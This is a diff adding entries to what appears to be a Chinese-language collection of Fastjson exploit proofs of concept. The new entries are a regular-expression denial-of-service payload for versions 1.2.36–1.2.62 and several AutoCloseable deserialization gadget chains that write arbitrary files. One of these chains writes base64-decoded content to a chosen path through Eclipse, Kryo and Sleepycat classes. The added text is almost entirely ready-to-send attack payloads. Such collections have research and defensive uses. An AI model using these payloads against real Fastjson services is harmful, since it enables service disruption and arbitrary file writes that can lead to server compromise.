@@ -469,6 +469,26 @@ poc:
 
 **1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索**
 
+### Fastjson 1.2.36 - 1.2.62
+正则表达式拒绝服务漏洞
+
+```
+{
+    "regex":{
+        "$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"
+    },
+    "blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+}
+```
+```
+{
+    "regex":{
+        "$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"
+    },
+    "blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+}
+```
+
 
 ### Fastjson1.2.5 <= 1.2.59
 
@@ -638,6 +658,23 @@ poc:
 ```
 
 
+写文件
+```json
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'java.io.FileOutputStream',
+    'file':'/tmp/nonexist',
+    'append':false
+}
+```
+```json
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'java.io.FileWriter',
+    'file':'/tmp/nonexist',
+    'append':false
+}
+```
 
 写文件
 
@@ -708,7 +745,7 @@ poc:
 
 适用于jdk8/10的
 
-```java
+```json
 {
     '@type':"java.lang.AutoCloseable",
     '@type':'sun.rmi.server.MarshalOutputStream',
@@ -730,6 +767,36 @@ poc:
     'protocolVersion':1
 }
 ```
+jdk 8
+- position写入的长度，必须和base64编码前的长度一致。
+```json
+{
+    "stream": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
+        "targetPath": "f:/pwn.txt",
+        "tempPath": ""
+    },
+    "writer": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "com.esotericsoftware.kryo.io.Output",
+        "buffer": "YjF1M3I=",
+        "outputStream": {
+            "$ref": "$.stream"
+        },
+        "position": 5
+    },
+    "close": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "com.sleepycat.bind.serial.SerialOutput",
+        "out": {
+            "$ref": "$.writer"
+        }
+    }
+}
+```
+
+
 2021黑帽大会腾讯玄武披露   
 详细漏洞原理待研究
 ```java
